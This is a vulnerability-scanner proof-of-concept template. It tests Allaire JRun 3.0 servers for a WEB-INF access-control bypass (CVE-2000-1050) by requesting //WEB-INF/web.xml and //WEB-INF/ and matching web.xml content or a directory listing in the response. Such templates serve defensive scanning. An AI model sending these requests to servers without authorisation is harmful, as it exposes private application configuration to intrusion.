[info]
author = "ave"
description = "通过向 JRun 3.0 HTTP Servlet 服务器发送包含额外前导斜杠的 URL 请求（如 //WEB-INF/web.xml），检测是否存在 WEB-INF 目录绕过访问控制漏洞。若响应包含 web.xml 等敏感内容则判定存在漏洞。"
id = "POC-AVE-2000-0762"
name = "Allaire JRun 3 Directory Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0762"]
vuln_id = [
    "CVE-2000-1050",
    "AVE-2000-0762",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//WEB-INF/web.xml"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<web-app",
    "WEB-INF",
    "web.xml",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//WEB-INF/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "WEB-INF",
    "Directory listing",
]
